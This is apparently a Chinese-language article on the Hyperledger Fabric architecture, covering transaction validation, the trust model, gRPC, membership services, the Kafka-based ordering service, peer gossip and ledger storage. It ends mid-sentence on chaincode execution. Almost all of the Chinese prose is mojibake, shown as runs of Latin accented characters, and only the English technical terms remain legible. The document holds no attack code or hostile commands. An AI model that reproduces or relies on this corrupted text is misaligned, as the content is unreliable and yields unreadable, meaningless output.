æ­¤Fabricå¯ä»¥é…ç½®ä½¿ç”¨å†…ç½®çš„gossipæœåŠ¡ï¼Œå°†æ’åºæœåŠ¡ä¸­äº¤ä»˜çš„åŒºå—åˆ†å‘ç»™æ‰€æœ‰çš„èŠ‚ç‚¹ã€‚\néªŒè¯é˜¶æ®µ æ’åºæœåŠ¡ä¼šæŠŠåŒºå—ç›´æ¥åˆ†å‘ç»™å„ä¸ªèŠ‚ç‚¹ï¼ˆæˆ–é€šè¿‡gossipï¼‰ã€‚éšåï¼Œä¸€ä¸ªæ–°çš„åŒºå—è¿›å…¥éªŒè¯é˜¶æ®µï¼ŒåŒ…å«ä¸‰ä¸ªè¿ç»­æ­¥éª¤ï¼š\nå¹¶è¡Œæ‰§è¡ŒåŒºå—ä¸­æ‰€æœ‰çš„äº¤æ˜“çš„èƒŒä¹¦æ”¿ç­–è¯„ä¼°ã€‚è¯„ä¼°æ˜¯éªŒè¯ç³»ç»Ÿé“¾ç (VSCC, validation system chaincode)çš„ä»»åŠ¡ã€‚VSCCæ˜¯ä¸€ä¸ªé™æ€åº“ï¼Œæ˜¯åŒºå—é“¾é…ç½®çš„ä¸€éƒ¨åˆ†ï¼Œè´Ÿè´£æ ¹æ®é“¾ç ä¸­çš„èƒŒä¹¦æ”¿ç­–éªŒè¯èƒŒä¹¦ã€‚å¦‚æœä¸æ»¡è¶³ï¼Œè¿™ä¸ªäº¤æ˜“ä¼šè¢«æ ‡è®°ä¸ºæ— æ•ˆï¼Œå¹¶è¢«å¿½ç•¥ã€‚ å¯¹å—ä¸­çš„æ‰€æœ‰äº¤æ˜“è¿›è¡Œè¯»å†™å†²çªæ£€æŸ¥(read-write conflict check)ï¼ˆç‰ˆæœ¬å·æ¯”è¾ƒï¼‰ã€‚å¯¹äºæ¯ä¸ªäº¤æ˜“ï¼Œå°†ä¼šå¯¹æ¯”å…¶ä¸­readsetçš„ç‰ˆæœ¬å·å’ŒèŠ‚ç‚¹æœ¬åœ°å­˜å‚¨çš„è´¦æœ¬å½“å‰çŠ¶æ€ä¸­çš„ç‰ˆæœ¬å·ï¼Œç¡®ä¿ç‰ˆæœ¬ç›¸åŒã€‚å¦‚æœç‰ˆæœ¬ä¸åŒ¹é…ï¼Œäº¤æ˜“ä¼šè¢«æ ‡è®°ä¸ºæ— æ•ˆï¼Œå¹¶è¢«å¿½ç•¥ã€‚ æœ€åè¿›è¡Œè´¦æœ¬çš„æ›´æ–°é˜¶æ®µï¼Œåœ¨è¿™ä¸ªé˜¶æ®µï¼ŒåŒºå—è¢«è¿½åŠ åˆ°æœ¬åœ°å­˜å‚¨çš„è´¦æœ¬ä¸­ï¼Œå¹¶ä¸”æ›´æ–°åŒºå—é“¾çš„çŠ¶æ€ã€‚å°†åŒºå—æ·»åŠ åˆ°è´¦æœ¬æ—¶ï¼Œå‰ä¸¤æ­¥çš„æ£€æŸ¥ç»“æœå°†è¢«æŒä¹…åŒ–ä»¥æ©ç çš„å½¢å¼è¡¨ç¤ºåŒºå—ä¸­çš„äº¤æ˜“æœ‰æ•ˆã€‚è¿™æœ‰åŠ©äºåé¢è¿›è¡Œé‡å»ºçŠ¶æ€ã€‚æ­¤å¤–ï¼Œæ‰€æœ‰çš„çŠ¶æ€æ›´æ–°éƒ½æ˜¯é€šè¿‡å°†writesetä¸­çš„é”®å€¼å¯¹å†™å…¥æœ¬åœ°å®Œæˆçš„ã€‚ ä¿¡ä»»ä¸æ•…éšœæ¨¡å‹ Fabricå¯ä»¥é€‚åº”çµæ´»çš„ä¿¡ä»»å’Œæ•…éšœå‡è®¾ã€‚é€šå¸¸æƒ…å†µä¸‹ï¼Œæ‰€æœ‰çš„å®¢æˆ·ç«¯éƒ½è¢«è®¤ä¸ºæ˜¯æ½œåœ¨çš„æ¶æ„ç”¨æˆ·æˆ–æ˜¯Byzantineã€‚èŠ‚ç‚¹éƒ½è¢«å½’å…¥ç»„ç»‡(organization)å¹¶ä¸”æ¯ä¸ªç»„ç»‡ç»„æˆä¸€ä¸ªä¿¡ä»»åŸŸ(trust domain)ã€‚æ¯ä¸ªèŠ‚ç‚¹ä¿¡ä»»å…¶ç»„ç»‡å†…éƒ¨çš„å…¶ä»–èŠ‚ç‚¹ï¼Œè€Œä¸ä¿¡ä»»å…¶ä»–ç»„ç»‡çš„èŠ‚ç‚¹ã€‚æ’åºæœåŠ¡åŒæ ·è®¤ä¸ºæ‰€æœ‰çš„èŠ‚ç‚¹ï¼ˆæˆ–å®¢æˆ·ç«¯ï¼‰éƒ½æ˜¯æ½œåœ¨çš„æ‹œå åº­ã€‚\nFabricç½‘ç»œçš„å®Œæ•´æ€§ä¾èµ–äºæ’åºæœåŠ¡çš„ä¸€è‡´æ€§ã€‚æ’åºæœåŠ¡çš„ä¿¡ä»»æ¨¡å‹å–å†³äºå…¶å®ç°ã€‚\nåœ¨Fabricä¸­ï¼Œåˆ†å¸ƒå¼åº”ç”¨å¯ä»¥å®šä¹‰è‡ªå·±çš„ä¿¡ä»»å‡è®¾ï¼Œé€šè¿‡èƒŒä¹¦æ”¿ç­–æ¥ä¼ è¾¾ï¼Œå¹¶ä¸”ç‹¬ç«‹äºæ’åºæœåŠ¡å®ç°çš„å…±è¯†çš„ä¿¡ä»»å‡è®¾ã€‚\nç»„ä»¶ Fabricä½¿ç”¨äº†gRPCæ¶æ„å®ç°å®¢æˆ·ç«¯ã€èŠ‚ç‚¹å’Œæ’åºæœåŠ¡ä¹‹é—´çš„é€šä¿¡ã€‚\nWhat is gRPC?\nA high-performance, open-source universal RPC framework\ngRPCæ¡†æ¶å…·æœ‰é«˜æ€§èƒ½ï¼Œå¼€æºï¼Œè·¨è¯­è¨€çš„ç‰¹ç‚¹ï¼Œä½¿ç”¨äº†RPCæ¡†æ¶ï¼ŒåŸºäºHTTP/2è®¾è®¡ã€‚\nRPC(remote procedure callï¼Œè¿œç¨‹è¿‡ç¨‹è°ƒç”¨)æ¡†æ¶æä¾›äº†ä¸€å¥—æœºåˆ¶ï¼Œä½¿å¾—åº”ç”¨ç¨‹åºä¹‹é—´å¯ä»¥è¿›è¡Œé€šä¿¡ï¼Œéµä»server/clientæ¨¡å‹ã€‚\nRPCå°†ä¸€ä¸ªæœåŠ¡è°ƒç”¨å°è£…åœ¨ä¸€ä¸ªæœ¬åœ°æ–¹æ³•ä¸­ï¼Œè®©è°ƒç”¨è€…åƒä½¿ç”¨æœ¬åœ°æ–¹æ³•ä¸€æ ·è°ƒç”¨æœåŠ¡ï¼Œå¯¹å…¶å±è”½å®ç°ç»†èŠ‚ã€‚å…·ä½“çš„å®ç°åˆ™é€šè¿‡è°ƒç”¨æ–¹å’ŒæœåŠ¡æ–¹çš„åè®®ï¼ŒåŸºäºTCPè¿æ¥è¿›è¡Œæ•°æ®äº¤äº’è¾¾æˆã€‚\nåœ¨æœ¬åœ°è°ƒç”¨è¿‡ç¨‹ä¸­ï¼Œé€šå¸¸éœ€è¦é€šè¿‡æ¥å£ï¼Œè°ƒç”¨å…·ä½“å®ç°ï¼Œæœ€ç»ˆè·å–ç›¸åº”çš„æ•°æ®ã€‚\nè€Œåœ¨RPCä¸­ï¼Œæœ¬åœ°è·å–åˆ°æ¥å£ï¼Œéšåé€šè¿‡ç½‘ç»œï¼Œè°ƒç”¨è¿œç¨‹çš„å®ç°ã€‚åœ¨ä½¿ç”¨ç½‘ç»œæ—¶ï¼Œéœ€è¦é€šè¿‡æ•°æ®åºåˆ—åŒ–æ¥ä¼ è¾“æ•°æ®ã€‚\nåœ¨gRPCä¸­ï¼Œæ”¯æŒå¤šä¸ªè¯­è¨€çš„åº”ç”¨ç¨‹åºçš„è¿œç¨‹è°ƒç”¨ï¼Œæ•°æ®äº¤æ¢æ ¼å¼åˆ™é‡‡ç”¨äº†Protocol Bufferã€‚\nå¦‚ä¸‹å›¾æ‰€ç¤ºï¼Œå·¦ä¾§ä¸ºc++è¯­è¨€ç¼–å†™çš„å®¢æˆ·ç«¯ï¼Œå…¶ä¸­åŒ…å«äº†æ¥å£çš„å…·ä½“å®ç°ã€‚å³ä¾§ä¸ºRubyå’ŒJavaå®¢æˆ·ç«¯ï¼Œå…¶ä¸­å¯¹æ¥å£è¿›è¡Œäº†è°ƒç”¨ã€‚å®¢æˆ·ç«¯è·å–æ¥å£åï¼Œå°†æ•°æ®é€šè¿‡Protocol Bufferçš„åºåˆ—åŒ–å¤„ç†åäº¤ç»™æœåŠ¡ç«¯ï¼ŒæœåŠ¡ç«¯è°ƒç”¨å…·ä½“å®ç°ï¼Œå¹¶æŠŠæ•°æ®åŒæ ·ä»¥åºåˆ—åŒ–çš„å½¢å¼è¿”å›ç»™å®¢æˆ·ç«¯ã€‚\ngRPC-basic æˆå‘˜èº«ä»½ç®¡ç†æœåŠ¡ï¼ˆMSPï¼‰ æˆå‘˜èº«ä»½ç®¡ç†æœåŠ¡(MSP, membership service provider)ç»´æŠ¤äº†ç³»ç»Ÿä¸­æ‰€æœ‰èŠ‚ç‚¹ï¼ˆå®¢æˆ·ç«¯ã€èŠ‚ç‚¹ã€æ’åºæœåŠ¡ï¼‰çš„èº«åˆ†ï¼Œå¹¶è´Ÿè´£å‘å¸ƒèŠ‚ç‚¹çš„å‡­è¯ï¼Œç”¨äºè®¤è¯å’Œæˆæƒã€‚èŠ‚ç‚¹ä¹‹é—´çš„æ‰€æœ‰äº¤äº’éƒ½æ˜¯é€šè¿‡å·²è®¤è¯çš„æ¶ˆæ¯ï¼ˆé€šå¸¸æ˜¯æ•°å­—ç­¾åï¼‰å‘ç”Ÿçš„ã€‚æˆå‘˜èº«ä»½ç®¡ç†åŒ…æ‹¬æ¯ä¸ªèŠ‚ç‚¹çš„ç»„ä»¶ï¼Œå¯ä»¥è®¤è¯äº¤æ˜“ã€éªŒè¯äº¤æ˜“çš„å®Œæ•´æ€§ã€ç­¾ç½²å¹¶ç¡®è®¤èƒŒä¹¦ã€éªŒè¯å…¶ä»–çš„åŒºå—é“¾æ“ä½œã€‚MSPä¸­è¿˜åŒ…æ‹¬äº†ç”¨äºå¯†é’¥ç®¡ç†å’ŒèŠ‚ç‚¹æ³¨å†Œçš„å·¥å…·ã€‚\nMSPæ˜¯æŠ½è±¡çš„ï¼Œå¯ä»¥æœ‰ä¸åŒçš„å®ä¾‹ã€‚Fabricä¸­ï¼Œé»˜è®¤çš„MSPå®ç°å¯ä»¥å¤„ç†åŸºäºæ•°å­—ç­¾åçš„PKIè®¤è¯æ–¹æ³•ï¼Œå¹¶ä¸”å®¹çº³å•†ä¸šè®¤è¯æœºæ„(CA)ã€‚Fabricæä¾›äº†ç‹¬ç«‹çš„CAâ€”â€”Fabric-CAã€‚\nFabricå…è®¸è®¾ç½®åŒºå—é“¾ç½‘ç»œçš„ä¸¤ç§æ¨¡å¼ã€‚åœ¨ç¦»çº¿æ¨¡å¼ä¸‹ï¼Œå‡­è¯ç”±CAç”Ÿæˆï¼Œå¹¶åˆ†å‘åˆ°æ‰€æœ‰èŠ‚ç‚¹ã€‚peerèŠ‚ç‚¹å’Œæ’åºèŠ‚ç‚¹åªèƒ½åœ¨ç¦»çº¿æ¨¡å¼ä¸‹æ³¨å†Œã€‚å¯¹äºå®¢æˆ·ç«¯çš„æ³¨å†Œï¼ŒFabric-CAæä¾›äº†åœ¨çº¿æ¨¡å¼ï¼Œå‘å®¢æˆ·ç«¯å‘é€åŠ å¯†å‡­è¯ã€‚MSPçš„é…ç½®å¿…é¡»è¦ç¡®ä¿æ‰€æœ‰çš„èŠ‚ç‚¹éƒ½èƒ½è¯†åˆ«ç›¸åŒçš„èº«ä»½å’Œè®¤è¯è®¤å®šä¸ºæœ‰æ•ˆï¼ˆç‰¹åˆ«æ˜¯æ‰€æœ‰çš„peerèŠ‚ç‚¹ï¼‰ã€‚\nä¾‹å¦‚ï¼Œå½“å¤šä¸ªç»„ç»‡åœ¨åŒä¸€ä¸ªåŒºå—é“¾ç½‘ç»œä¸­æ—¶ï¼ŒMSPéœ€è¦èƒ½å¤Ÿå…è®¸èº«ä»½çš„è”åˆã€‚æ¯ä¸ªç»„ç»‡å‘è‡ªå·±çš„æˆå‘˜å‘æ”¾èº«ä»½ï¼Œæ¯ä¸ªpeerèŠ‚ç‚¹éƒ½èƒ½è¯†åˆ«æ‰€æœ‰ç»„ç»‡çš„æˆå‘˜ã€‚è¿™å¯ä»¥é€šè¿‡å¤šä¸ªMSPå®ä¾‹æ¥å®ç°ã€‚ä¾‹å¦‚ï¼Œåœ¨æ¯ä¸ªç»„ç»‡å’Œä¸€ä¸ªMSPä¹‹é—´å»ºç«‹ä¸€ä¸ªæ˜ å°„ã€‚\næ’åºæœåŠ¡ æ’åºæœåŠ¡å¯ç®¡ç†å¤šä¸ªé€šé“ï¼Œå¯¹æ¯ä¸ªé€šé“ï¼Œéƒ½æä¾›å¦‚ä¸‹ä¸‰ä¸ªæœåŠ¡ï¼š\nAtomic broadcastï¼Œç”¨äºå¯¹äº¤æ˜“è¿›è¡Œæ’åºï¼Œå®ç°å¹¿æ’­å’Œåˆ†å‘ é‡æ–°é…ç½®(reconfiguration)é€šé“ï¼Œæˆå‘˜é€šè¿‡å¹¿æ’­ä¸€ä¸ªé…ç½®æ›´æ–°äº‹ç‰©(configuration update transaction)ä¿®æ”¹é€šé“ã€‚ ï¼ˆå¯é€‰æ‹©ï¼‰è®¿é—®æ§åˆ¶(access control)ï¼Œåœ¨è¿™äº›é…ç½®ä¸­ï¼Œæ’åºæœåŠ¡ä½œä¸ºå¯ä¿¡çš„å®ä½“ï¼Œé™åˆ¶äº¤æ˜“çš„å¹¿æ’­å’ŒæŒ‡å®špeerèŠ‚ç‚¹å’Œå®¢æˆ·ç«¯çš„å—çš„æ¥æ”¶ æ’åºæœåŠ¡é€šè¿‡ç³»ç»Ÿé€šé“ä¸Šçš„ç”Ÿæˆå—è¿›è¡Œå¼•å¯¼ã€‚ç”Ÿæˆå—æºå¸¦äº†é…ç½®äº‹åŠ¡(configuration transaction)ï¼Œå®šä¹‰äº†æ’åºæœåŠ¡çš„æ“ä½œã€‚\nå½“å‰ç‰ˆæœ¬çš„å®ç°ç”±OSNç»„æˆï¼ŒOSNå®ç°äº†æè¿°çš„æ“ä½œå¹¶ä¸”é€šè¿‡ç³»ç»Ÿé€šé“é€šä¿¡ã€‚å®é™…çš„atomic broadcastå‡½æ•°ç”±åŸºäºZooKeeperçš„Kafkaå®ä¾‹æä¾›ï¼Œè¿™ä¸ªå®ä¾‹æä¾›äº†å¯ä»¥æ‰©å±•çš„å‘å¸ƒ-è®¢é˜…æ¶ˆæ¯ï¼Œåœ¨èŠ‚ç‚¹å´©æºƒåä»å…·æœ‰å¼ºä¸€è‡´æ€§(consistency)ã€‚è¿™ä¸ªå®ç°å¯ä»¥è¿è¡Œåœ¨ä¸OSNåˆ†ç¦»çš„ç‰©ç†èŠ‚ç‚¹ä¸Šã€‚OSNä½œä¸ºpeerså’ŒKafkaå®ä¾‹ä¹‹é—´çš„ä»£ç†ã€‚\nOSNç›´æ¥å°†æ”¶åˆ°çš„æ–°äº¤æ˜“æ³¨å…¥åˆ°å¹¿æ’­ä¸­ã€‚OSNå°†ä»å¹¿æ’­ä¸­æ¥æ”¶åˆ°çš„äº¤æ˜“è½¬æ¢æˆå—ã€‚åªè¦æ»¡è¶³ä¸‰ä¸ªæƒ…å†µä¹‹ä¸€ï¼Œå—å°±ä¼šè¢«æ–­å¼€ã€‚\nåŒºå—åŒ…å«äº†äº¤æ˜“å…è®¸çš„æœ€å¤§å€¼ åŒºå—è¾¾åˆ°æœ€å¤§å¤§å° ä»æ¥æ”¶åˆ°ç¬¬ä¸€ä¸ªäº¤æ˜“åè¶…è¿‡æŸç‰¹å®šæ—¶é—´ æ‰¹å¤„ç†çš„è¿‡ç¨‹æ˜¯ç¡®å®šçš„ï¼Œå› æ­¤åœ¨æ‰€æœ‰èŠ‚ç‚¹ä¸Šéƒ½ä¼šäº§ç”Ÿç›¸åŒçš„åŒºå—ã€‚è€ƒè™‘åˆ°ä»å¹¿æ’­ä¸­æ¥æ”¶çš„äº¤æ˜“æ•°æ®æµï¼Œå‰ä¸¤é¡¹æƒ…å†µæ˜¯å·²ç»ç¡®å®šçš„ã€‚å¯¹äºç¬¬ä¸‰ä¸ªæ¡ä»¶ï¼Œå½“èŠ‚ç‚¹è¯»å…¥å—ä¸­çš„ç¬¬ä¸€ä¸ªäº¤æ˜“æ—¶ï¼Œä¼šå¼€å¯ä¸€ä¸ªè®¡æ—¶å™¨ã€‚å¦‚æœè®¡æ—¶å™¨è¶…æ—¶åï¼Œè¿™ä¸ªåŒºå—ä»ç„¶æ²¡æœ‰æ–­å¼€ï¼ŒOSNä¼šåœ¨é€šé“ä¸Šå¹¿æ’­ä¸€ä¸ªç‰¹æ®Šçš„â€œåˆ°æ—¶æ–­å¼€(time-to-cut)â€äº¤æ˜“ï¼Œå…¶ä¸­è®°å½•äº†éœ€è¦æ–­å¼€çš„åŒºå—çš„åºåˆ—å·ã€‚å¦ä¸€æ–¹é¢ï¼Œæ¯ä¸ªOSNåœ¨æ”¶åˆ°â€œåˆ°æ—¶æ–­å¼€â€äº¤æ˜“åï¼Œä¼šæ ¹æ®å…¶ç»™å®šçš„åºåˆ—å·ï¼Œç«‹å³åˆ‡æ–­æ–°çš„åŒºå—ã€‚è¿™ä¸ªäº¤æ˜“æ˜¯åŸå­æ€§çš„åˆ†å‘ç»™æ‰€æœ‰è¿æ¥çš„OSNï¼Œæ‰€ä»¥åŒºå—ä¸­éƒ½åŒ…å«ç›¸åŒçš„äº¤æ˜“åˆ—è¡¨ã€‚OSNå°†æœ€è¿‘äº¤ä»˜çš„ä¸€ç³»åˆ—åŒºå—ç›´æ¥æŒä¹…åŒ–åˆ°æ–‡ä»¶ç³»ç»Ÿä¸­ï¼Œå› æ­¤å¯ä»¥é€šè¿‡åˆ†å‘å›ç­”peerèŠ‚ç‚¹æ¥å›æ”¶åŒºå—ã€‚\nPeer Gossip å°†ä¸‰ä¸ªé˜¶æ®µåˆ†å¼€çš„å¥½å¤„æ˜¯åœ¨å¼€å‘çš„æ—¶å€™å¯ä»¥ç‹¬ç«‹æ‰©å±•ã€‚ç„¶è€Œï¼Œç”±äºå…±è¯†ç®—æ³•å¾€å¾€æœ‰å¸¦å®½é™åˆ¶ï¼Œæ’åºæœåŠ¡çš„ååé‡è¢«èŠ‚ç‚¹çš„ç½‘ç»œå®¹é‡æ‰€é™åˆ¶ã€‚å…±è¯†æ— æ³•é€šè¿‡å¢åŠ èŠ‚ç‚¹è€Œæ‰©å±•ï¼Œåè€Œä¼šè®©ååé‡é™ä½ã€‚ç„¶è€Œï¼Œç”±äºæ’åºå’ŒéªŒè¯æ˜¯åˆ†å¼€çš„ï¼Œåœ¨æ’åºé˜¶æ®µåï¼Œé‡è¦çš„æ˜¯å¦‚ä½•æœ‰æ•ˆåœ°å¹¿æ’­æ‰§è¡Œé˜¶æ®µçš„ç»“æœï¼Œä»¥äº¤ç»™peerèŠ‚ç‚¹è¿›è¡ŒéªŒè¯ã€‚æ­¤å¤–ï¼Œè¿˜æœ‰å¦‚ä½•å¯¹æ–°åŠ å…¥çš„peerèŠ‚ç‚¹å’Œé•¿æœŸæ–­å¼€çš„peerèŠ‚ç‚¹è¿›è¡ŒçŠ¶æ€è½¬ç§»ã€‚è¿™ä¸¤ä¸ªé—®é¢˜å°±æ˜¯gossipç»„ä»¶æ‰€éœ€è¦è§£å†³çš„ã€‚Fabric gossipåˆ©ç”¨æµè¡Œç»„æ’­(epidemic multicast)æ¥è§£å†³è¿™ä¸ªé—®é¢˜ã€‚åŒºå—æ˜¯ç”±æ’åºæœåŠ¡ç­¾ç½²çš„ã€‚è¿™æ„å‘³ç€ä¸€ä¸ªpeerèŠ‚ç‚¹åœ¨æ”¶åˆ°æ‰€æœ‰åŒºå—åï¼Œå¯ä»¥ç‹¬ç«‹çš„ç»„è£…ä¸ºåŒºå—é“¾å¹¶éªŒè¯å…¶å®Œæ•´æ€§ã€‚\ngossipçš„é€šä¿¡åŸºäºgRPCï¼Œåˆ©ç”¨TLSï¼ˆä¼ è¾“å±‚å®‰å…¨åè®®ï¼‰è¿›è¡Œç›¸äº’è¯†åˆ«ï¼Œä½¿å¾—æ¯ä¸€æ–¹éƒ½å¯ä»¥å°†TLSå‡­è¯ä¸è¿œç¨‹peerèŠ‚ç‚¹çš„èº«ä»½ç»‘å®šã€‚gossipç»„ä»¶ç”¨æ¥ç»´æŠ¤ç³»ç»Ÿä¸­å½“å‰åœ¨çº¿çš„peerèŠ‚ç‚¹çš„æˆå‘˜è§†å›¾ã€‚æ‰€æœ‰çš„peerèŠ‚ç‚¹é€šè¿‡å®šæœŸä¼ æ’­æˆå‘˜æ•°æ®ç‹¬ç«‹å»ºç«‹ä¸€ä¸ªæœ¬åœ°è§†å›¾ã€‚æ­¤å¤–ï¼Œä¸€ä¸ªpeerèŠ‚ç‚¹å¯ä»¥åœ¨ç½‘ç»œå´©æºƒæˆ–è€…ä¸­æ–­åé‡æ–°è¿å…¥æˆå‘˜è§†å›¾ã€‚\nFabricçš„gossipç»„ä»¶é‡‡ç”¨äº†ä¸¤ä¸ªé˜¶æ®µè¿›è¡Œä¿¡æ¯çš„ä¼ æ’­ï¼š\nåœ¨pushé˜¶æ®µï¼Œæ¯ä¸ªpeerèŠ‚ç‚¹ä»æˆå‘˜è§†å›¾ä¸­é€‰æ‹©ä¸€ä¸ªéšæœºçš„æ´»è·ƒé‚»å±…é›†åˆï¼Œå¹¶å‘ä»–ä»¬å‘é€ä¿¡æ¯ åœ¨pullé˜¶æ®µï¼Œæ¯ä¸ªpeerèŠ‚ç‚¹å®šæœŸæ¢æµ‹ä¸€ä¸ªéšæœºé€‰æ‹©çš„peerèŠ‚ç‚¹é›†åˆï¼Œå¹¶è¯·æ±‚ç¼ºå¤±çš„ä¿¡æ¯ ç ”ç©¶è¡¨æ˜ï¼ŒåŒæ—¶ä½¿ç”¨è¿™ä¸¤ç§æ–¹æ³•å¯ä»¥ä¼˜åŒ–å¯ç”¨å¸¦å®½å¹¶ç¡®ä¿æ‰€æœ‰peerèŠ‚ç‚¹æœ‰å¾ˆé«˜çš„æ¦‚ç‡æ¥æ”¶åˆ°æ‰€æœ‰ä¿¡æ¯ã€‚\nä¸ºäº†å‡å°‘ä»æ’åºèŠ‚ç‚¹å‘ç½‘ç»œä¸­å‘é€çš„åŒºå—çš„è´Ÿè½½ï¼Œåè®®åŒæ—¶åœ¨peerä¸­é€‰æ‹©äº†ä¸€ä¸ªé¢†å¯¼è€…(elects a leader peer)ï¼Œä»£è¡¨peerèŠ‚ç‚¹ä»æ’åºæœåŠ¡ä¸­pullåŒºå—ï¼Œå¹¶å¯åŠ¨gossipåˆ†å‘ã€‚è¿™ä¸ªæœºåˆ¶å¯¹é¢†å¯¼è€…å‡ºç°æ•…éšœå…·æœ‰å¼¹æ€§ã€‚\nåˆ†å¸ƒå¼è´¦æœ¬(Ledger) è´¦æœ¬ç»„ä»¶åœ¨å„ä¸ªpeerèŠ‚ç‚¹ä¸­ç»´æŒåˆ†å¸ƒå¼è´¦æœ¬å¹¶å»ºç«‹æŒä¹…æ€§çš„å­˜å‚¨ï¼Œå¹¶å®ç°è´¦æœ¬çš„æ¨¡æ‹Ÿã€éªŒè¯å’Œæ›´æ–°é˜¶æ®µã€‚æ•´ä½“ä¸Šç”±ä¸€ä¸ªåŒºå—å­˜å‚¨(block store)å’Œä¸€ä¸ªpeerèŠ‚ç‚¹äº¤æ˜“ç®¡ç†å™¨(peer transaction manager)ç»„æˆã€‚\nåŒºå—å­˜å‚¨(Ledger Block Store) è´¦æœ¬åŒºå—å­˜å‚¨æŒä¹…åŒ–äº¤æ˜“åŒºå—ï¼Œå¹¶ä»¥ä¸€ç»„ä»…è¿½åŠ æ–‡ä»¶çš„å½¢å¼å®ç°ã€‚ç”±äºåŒºå—æ— æ³•è¢«æ”¹å˜ï¼Œå¹¶ä»¥ä¸€ä¸ªç‰¹å®šçš„é¡ºåºåˆ°è¾¾ï¼Œä¸€ä¸ªä»…è¿½åŠ çš„ç»“æ„èƒ½å¤Ÿå¸¦æ¥æœ€å¥½çš„æ€§èƒ½ã€‚æ­¤å¤–ï¼ŒåŒºå—å­˜å‚¨ä¸­ç»´æŠ¤äº†ä¸€äº›ç´¢å¼•(indices)ï¼Œç”¨æ¥éšæœºè®¿é—®åŒºå—æˆ–åŒºå—ä¸­çš„äº¤æ˜“ã€‚\npeeräº¤æ˜“ç®¡ç†å™¨(Peer Transaction Manager) peerèŠ‚ç‚¹äº¤æ˜“ç®¡ç†å™¨(PTM)ä¿æŒç‰ˆæœ¬é”®å€¼å¯¹å¤„äºæœ€æ–°çŠ¶æ€ã€‚å®ƒèƒ½ä¸ºæ¯ä¸€ä¸ªå”¯ä¸€çš„æ¡ç›®(entry)çš„keyä»¥(key,val, ver)å­˜å‚¨ä¸€ä¸ªå…ƒç»„ï¼Œå…¶ä¸­åŒ…å«äº†æœ€è¿‘å­˜å‚¨çš„å€¼valï¼Œå’Œæœ€æ–°çš„ç‰ˆæœ¬å·varã€‚ç‰ˆæœ¬ç”±åŒºå—åºåˆ—å·å’ŒåŒºå—å†…çš„äº¤æ˜“åºåˆ—å·ç»„æˆï¼Œå› æ­¤ç‰ˆæœ¬å·éƒ½æ˜¯å”¯ä¸€ä¸”é€’å¢çš„ã€‚PTMä½¿ç”¨äº†æœ¬åœ°é”®å€¼å­˜å‚¨æ¥è¯†åˆ«ç‰ˆæœ¬å˜é‡ï¼Œå…·ä½“å®ç°ä½¿ç”¨äº†LevelDBå’ŒApache CouchDBã€‚\nåœ¨æ¨¡æ‹Ÿæ—¶ï¼ŒPTMæä¾›äº†ä¸€ä¸ªç¨³å®šçš„æœ€æ–°çŠ¶æ€å¿«ç…§ã€‚æ‰§è¡Œé˜¶æ®µä¸­æåˆ°ï¼ŒPTMåœ¨readsetä¸­ä¸ºGetStateè®¿é—®çš„æ¯ä¸ªæ¡ç›®è®°å½•ä¸€ä¸ªå…ƒç»„(key, ver)ï¼Œåœ¨writesetä¸­ä¸ºäº¤æ˜“è°ƒç”¨PutStateæ›´æ–°çš„æ¯ä¸ªæ¡ç›®è®°å½•ä¸€ä¸ªå…ƒç»„(key, val)ã€‚æ­¤å¤–ï¼ŒPTMæ”¯æŒèŒƒå›´æŸ¥è¯¢(range queries)ï¼Œå¹¶è®¡ç®—å‡ºæŸ¥è¯¢ç»“æœçš„åŠ å¯†å“ˆå¸Œï¼ˆä¸€ç»„(key, ver)å…ƒç»„ï¼‰ï¼Œå¹¶å°†æŸ¥è¯¢å­—ç¬¦ä¸²å’Œå“ˆå¸Œæ·»åŠ åˆ°readsetä¸­ã€‚\nåœ¨éªŒè¯é˜¶æ®µï¼ŒPTMä¾æ¬¡éªŒè¯ä¸€ä¸ªåŒºå—ä¸­çš„æ‰€æœ‰äº¤æ˜“ï¼Œæ£€æŸ¥äº¤æ˜“æ˜¯å¦ä¸ä¹‹å‰çš„ä»»ä½•äº¤æ˜“äº§ç”Ÿå†²çªã€‚å¯¹äºreadsetä¸­çš„æ‰€æœ‰keyï¼Œå¦‚æœreadsetä¸­çš„ç‰ˆæœ¬è®°å½•ä¸æœ€æ–°çŠ¶æ€çš„ç‰ˆæœ¬ä¸åŒï¼ŒPTMå°±ä¼šæŠŠè¿™ä¸ªäº¤æ˜“æ ‡è®°ä¸ºæ— æ•ˆã€‚å¯¹äºèŒƒå›´æŸ¥æ‰¾ï¼ŒPTMä¼šé‡æ–°æ‰§è¡ŒæŸ¥è¯¢å¹¶ä¸ä¹‹å‰çš„readsetæ¯”è¾ƒå“ˆå¸Œå€¼ï¼Œç¡®ä¿ä¸å‘ç”Ÿé”™è¯¯çš„è¯»å–ã€‚\nå´©æºƒå¤„ç† è´¦æœ¬ç»„ä»¶åœ¨æ›´æ–°æ—¶éœ€è¦èƒ½å¤„ç†peerèŠ‚ç‚¹çš„å´©æºƒã€‚\nåœ¨æ¥æ”¶åˆ°ä¸€ä¸ªæ–°åŒºå—åï¼ŒPTMå·²ç»å¯¹å…¶è¿›è¡Œäº†éªŒè¯ï¼Œå¹¶ä½¿ç”¨äº†æ©ç å°†åŒºå—ä¸­çš„äº¤æ˜“æ ‡è®°ä¸ºæœ‰æ•ˆæˆ–æ— æ•ˆã€‚æ­¤æ—¶ï¼Œè´¦æœ¬å°†åŒºå—å†™å…¥è´¦æœ¬çš„åŒºå—å­˜å‚¨ä¸­ï¼Œåˆ·æ–°åˆ°ç£ç›˜ï¼Œéšåæ›´æ–°åŒºå—å­˜å‚¨çš„ç´¢å¼•ã€‚éšåï¼ŒPTMå°†æ‰€æœ‰æœ‰æ•ˆäº¤æ˜“çš„writesetçŠ¶æ€å˜åŒ–åº”ç”¨åˆ°æœ¬åœ°å­˜å‚¨ä¸­ã€‚æœ€åï¼Œè®¡ç®—å¹¶æŒä¹…åŒ–ä¸€ä¸ªsavepointçš„å€¼ï¼Œè¡¨ç¤ºæˆåŠŸåº”ç”¨åŒºå—æ•°é‡çš„æœ€å¤§å€¼ã€‚ä»å´©æºƒä¸­æ¢å¤æ—¶ï¼Œsavepointå€¼ç”¨æ¥ä»æŒä¹…åŒ–å—ä¸­æ¢å¤ç´¢å¼•å’Œæœ€æ–°çŠ¶æ€ã€‚\né“¾ç æ‰§è¡Œ Chaincodeåœ¨ä¸€ä¸ªä¸å…¶ä½™peerèŠ‚ç‚¹æ¾æ•£è€¦åˆçš„ç¯å¢ƒä¸­æ‰§è¡Œã€‚æ”¯æŒå¢æ·»æ–°çš„é“¾ç 